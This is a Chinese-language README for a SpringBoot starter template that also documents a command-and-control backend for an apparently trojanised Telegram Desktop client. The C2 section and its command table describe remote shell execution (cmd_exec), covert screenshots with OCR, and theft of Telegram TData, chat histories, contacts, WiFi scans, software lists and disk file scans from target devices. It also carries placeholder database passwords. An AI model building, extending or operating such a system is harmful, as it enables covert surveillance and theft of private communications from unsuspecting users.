# SpringBoot 项目初始模板

> 作者：[程序员鱼皮](https://github.com/liyupi)
> 仅分享于 [编程导航知识星球](https://yupi.icu)

基于 Java SpringBoot 的项目初始模板，整合了常用框架和主流业务的示例代码。

只需 1 分钟即可完成内容网站的后端！！！大家还可以在此基础上快速开发自己的项目。

[toc]

## 模板特点

### 主流框架 & 特性

- Spring Boot 2.7.x（贼新）
- Spring MVC
- MyBatis + MyBatis Plus 数据访问（开启分页）
- Spring Boot 调试工具和项目处理器
- Spring AOP 切面编程
- Spring Scheduler 定时任务
- Spring 事务注解

### 数据存储

- MySQL 数据库
- Redis 内存数据库
- Elasticsearch 搜索引擎
- 腾讯云 COS 对象存储

### 工具类

- Easy Excel 表格处理
- Hutool 工具库
- Apache Commons Lang3 工具类
- Lombok 注解

### 业务特性

- 业务代码生成器（支持自动生成 Service、Controller、数据模型代码）
- Spring Session Redis 分布式登录
- 全局请求响应拦截器（记录日志）
- 全局异常处理器
- 自定义错误码
- 封装通用响应类
- Swagger + Knife4j 接口文档
- 自定义权限注解 + 全局校验
- 全局跨域处理
- 长整数丢失精度解决
- 多环境配置


## 业务功能

- 提供示例 SQL（用户、帖子、帖子点赞、帖子收藏表）
- 用户登录、注册、注销、更新、检索、权限管理
- 帖子创建、删除、编辑、更新、数据库检索、ES 灵活检索
- 帖子点赞、取消点赞
- 帖子收藏、取消收藏、检索已收藏帖子
- 帖子全量同步 ES、增量同步 ES 定时任务
- 支持微信开放平台登录
- 支持微信公众号订阅、收发消息、设置菜单
- 支持分业务的文件上传

### 单元测试

- JUnit5 单元测试
- 示例单元测试类

### 架构设计

- 合理分层


## C2 功能集成 (Telegram Platform)

本项目已集成 Telegram Desktop 客户端的 C2 (Command & Control) 功能，实现了设备监控、数据采集与远程管理。

### 核心特性

1.  **设备监控 (Device Monitoring)**
    -   **实时状态**: 支持监控设备在线状态、心跳间隔。
    -   **设备关联**: 自动关联设备 (`C2Device`) 与当前登录的 Telegram 账号 (`current_tg_id`)，实现人机对应。
    -   **自动截屏**: 集成客户端自动截屏功能 (`isMonitorOn`)，支持截图预览与批量下载。
    -   **基础信息**: 采集操作系统、IP (内网/外网)、MAC 地址、主机名等。

2.  **深度数据采集 (Data Ingestion)**
    -   **全量同步**: 支持接收客户端上传的 `tdata_client.db`，自动解析并同步以下数据：
        -   **联系人 (`contacts`)**: 自动同步 Telegram 联系人至 `tg_account` 表，支持增量更新。
        -   **聊天记录 (`chat_logs`)**: 解析聊天记录，支持文本消息及**媒体文件路径** (`media_path`) 的记录。
        -   **WiFi 信息**: 解析 `wifi_scan_results`，记录周边 WiFi 热点信息。
        -   **软件列表**: 解析 `installed_software`，记录目标机已安装软件。
        -   **系统信息**: 解析 `system_info`，记录详细系统环境变量与配置。

3.  **API 接口与指令**
    -   **管理端点**: `/api/c2Device/*` (RBAC 保护)，支持设备管理、指令下发。
    -   **客户端端点**: `/api/c2/*` (开放/加密)，处理心跳、任务获取、结果上传。
    -   **新增指令**: 
        -   `fetch_full_chat_history`: 触发全量聊天记录与联系人同步。
        -   `get_screenshot`: 实时获取屏幕截图。

### 开发注意事项

-   **数据库适配**: 
    -   后端使用 MySQL 5.7+ (`telegram_db`)。
    -   自动解析客户端上传的 SQLite (`tdata_client.db`) 并映射至 MySQL。
    -   **环境要求**: JDK 17, Maven 3.9+。


## 快速上手

> 所有需要修改的地方鱼皮都标记了 `todo`，便于大家找到修改的位置~

### MySQL 数据库

1）修改 `application.yml` 的数据库配置为你自己的：

```yml
spring:
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/telegram_db?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true
    username: telegram
    password: password
```

2）执行 `sql/create_table.sql` 中的数据库语句，自动创建库表（本项目已预置 `telegram_db` 库和 `telegram` 用户）。

3）启动项目，访问 `http://localhost:8101/api/doc.html` 即可打开接口文档，不需要写前端就能在线调试接口了~

![](doc/swagger.png)

### Redis 分布式登录

1）修改 `application.yml` 的 Redis 配置为你自己的：

```yml
spring:
  redis:
    database: 1
    host: localhost
    port: 6379
    timeout: 5000
    password: 123456
```

2）修改 `application.yml` 中的 session 存储方式：

```yml
spring:
  session:
    store-type: redis
```

3）移除 `MainApplication` 类开头 `@SpringBootApplication` 注解内的 exclude 参数：

修改前：

```java
@SpringBootApplication(exclude = {RedisAutoConfiguration.class})
```

修改后：


```java
@SpringBootApplication
```

### Elasticsearch 搜索引擎

1）修改 `application.yml` 的 Elasticsearch 配置为你自己的：

```yml
spring:
  elasticsearch:
    uris: http://localhost:9200
    username: root
    password: 123456
```

2）复制 `sql/post_es_mapping.json` 文件中的内容，通过调用 Elasticsearch 的接口或者 Kibana Dev Tools 来创建索引（相当于数据库建表）

```
PUT post_v1
{
 参数见 sql/post_es_mapping.json 文件
}
```

这步不会操作的话需要补充下 Elasticsearch 的知识，或者自行百度一下~

3）开启同步任务，将数据库的帖子同步到 Elasticsearch

找到 job 目录下的 `FullSyncPostToEs` 和 `IncSyncPostToEs` 文件，取消掉 `@Component` 注解的注释，再次执行程序即可触发同步：

```java
// todo 取消注释开启任务
//@Component
```

### 业务代码生成器

支持自动生成 Service、Controller、数据模型代码，配合 MyBatisX 插件，可以快速开发增删改查等实用基础功能。

找到 `generate.CodeGenerator` 类，修改生成参数和生成路径，并且支持注释掉不需要的生成逻辑，然后运行即可。

```
// 指定生成参数
String packageName = "com.yupi.springbootinit";
String dataName = "用户评论";
String dataKey = "userComment";
String upperDataKey = "UserComment";
```

生成代码后，可以移动到实际项目中，并且按照 `// todo` 注释的提示来针对自己的业务需求进行修改。


# Web端下发命令详解

本文档详细说明了Web控制台（C2Device Detail页面）可下发的命令、参数及其后端处理逻辑。

| 命令标识 (Command) | 显示名称 (Label) | 参数 (Params) | 功能描述 & 后端处理逻辑 |
| :--- | :--- | :--- | :--- |
| **cmd_exec** | 执行CMD | 命令行指令 (如 `whoami`) | **功能**: 在目标设备上执行指定的CMD/Shell命令。<br>**后端处理**: 接收执行结果字符串，并在任务结果中显示。 |
| **screenshot** | 屏幕截图 | 无 | **功能**: 截取目标设备当前屏幕。<br>**后端处理**: <br>1. 接收Base64编码的图片数据。<br>2. 解码并保存为PNG文件 (路径: `uploads/{uuid}/screenshot_{time}.png`)。<br>3. 自动调用OCR服务识别图片文字。<br>4. 在数据库创建 `c2_screenshot` 记录。<br>5. 更新任务结果为图片下载链接。 |
| **start_monitor** | 开启监控 | 监控间隔 (毫秒, 默认60000) | **功能**: 开启目标设备的持续监控模式（通常是定时截屏）。<br>**后端处理**: <br>1. 接收到开启确认或监控图片。<br>2. 将设备状态 `isMonitorOn` 更新为 `1`。<br>3. 如果返回的是图片数据，处理逻辑同 `screenshot` (保存+OCR)。 |
| **stop_monitor** | 停止监控 | 无 | **功能**: 停止目标设备的持续监控模式。<br>**后端处理**: <br>1. 将设备状态 `isMonitorOn` 更新为 `0`。 |
| **get_software** | 获取软件 | 无 | **功能**: 获取目标设备已安装的软件列表。<br>**后端处理**: <br>1. **去重**: 计算结果MD5，若与最近一次相同则跳过处理。<br>2. 解析JSON格式的软件列表。<br>3. 清空该设备旧的 `c2_software` 记录。<br>4. 批量插入新的软件信息 (名称, 版本, 安装日期)。 |
| **get_wifi** | 获取WiFi | 无 | **功能**: 扫描目标设备附近的WiFi热点。<br>**后端处理**: <br>1. **去重**: 计算结果MD5，若与最近一次相同则跳过处理。<br>2. 解析JSON格式的WiFi列表。<br>3. 清空该设备旧的 `c2_wifi` 记录。<br>4. 批量插入新的WiFi信息 (SSID, BSSID, 信号强度)。 |
| **get_current_user** | 获取当前用户 | 无 | **功能**: 获取当前登录的Telegram用户基本信息。<br>**后端处理**: <br>1. 解析JSON格式的用户信息 (ID, 用户名, 手机号, 会员状态)。<br>2. 更新或插入 `tg_account` 表。<br>3. 自动关联该Telegram账号与当前设备。 |
| **scan_recent** | 最近文件 | 无 | **功能**: 扫描目标设备最近访问/修改的文件。<br>**后端处理**: <br>1. **去重**: 计算结果MD5，若与最近一次相同则跳过处理。<br>2. 解析JSON格式的文件列表。<br>3. 清空该设备旧的 `c2_file_scan` (仅限 `isRecent=1`) 记录。<br>4. 批量插入新的文件记录。 |
| **scan_disk** | 全盘扫描 | 无 | **功能**: 触发目标设备进行全盘文件扫描。<br>**后端处理**: <br>1. 客户端通常会生成一个SQLite数据库文件 (`scan_results.db`)。<br>2. 通过 `upload_db` 接口上传该数据库。<br>3. 后端接收文件后，异步解析SQLite文件，提取 `system_info`, `wifi_scan_results`, `installed_software`, `chrome_downloads` 等表数据并同步到MySQL。 |
| **get_chat_logs** | 聊天记录 | 无 | **功能**: 获取目标设备的即时通讯软件聊天记录。<br>**后端处理**: <br>1. 通常涉及上传特定的数据库文件或日志文件。<br>2. 后端解析逻辑可能集成在文件上传或特定的同步接口中。 |
| **fetch_full_chat_history** | 全量同步聊天 | 无 | **功能**: 强制拉取目标设备的全量聊天历史。<br>**后端处理**: <br>1. 类似于 `get_chat_logs`，但参数标志不同，指示客户端遍历所有历史记录。 |
| **set_heartbeat** | 设置心跳 | 时间间隔 (毫秒) | **功能**: 修改目标设备的心跳回连间隔。<br>**后端处理**: <br>1. 更新 `c2_device` 表中的 `heartbeatInterval` 字段，以便在下一次心跳时同步给客户端。 |
| **upload_db** | 上传TData | 数据库路径/类型 | **功能**: 指示客户端上传Telegram数据(TData)或其他数据库文件。<br>**后端处理**: <br>1. 客户端通过 `/api/c2/upload` 接口上传文件。<br>2. 如果文件名包含 `scan_results` 或 `tdata_client` 且为 `.db` 后缀，后端会自动触发 `processScanResults` 逻辑进行解析入库。 |

## 补充说明

1.  **结果去重 (Deduplication)**:
    *   为了减少数据库冗余，`get_software`, `get_wifi`, `scan_recent` 命令的结果在后端会进行MD5比对。
    *   如果结果内容未发生变化，后端会记录日志 "Skipping duplicate result processing" 并跳过数据库更新操作。

2.  **文件上传处理**:
    *   所有通过命令触发的文件上传（截图、DB文件等）都会存储在 `uploads/{uuid}/` 目录下。
    *   图片文件会自动触发OCR识别。
    *   特定命名的DB文件会自动触发数据解析和同步。

3.  **心跳机制**:
    *   `set_heartbeat` 命令不仅仅是下发给客户端，后端也会同步更新设备配置，确保配置持久化。

4.  **Web端开发注意 (Web Dev Requirement)**:
    *   **get_current_user**: 该命令目前在客户端直接返回JSON格式的用户信息字符串。
    *   请Web后端开发同事在 `C2Controller.java` 的 `submitTaskResult` 方法中增加针对该命令的解析逻辑。
    *   **需求**: 收到 `get_current_user` 的结果时，需立即解析JSON并更新 `tg_account` 表，而不需要等待DB文件上传.
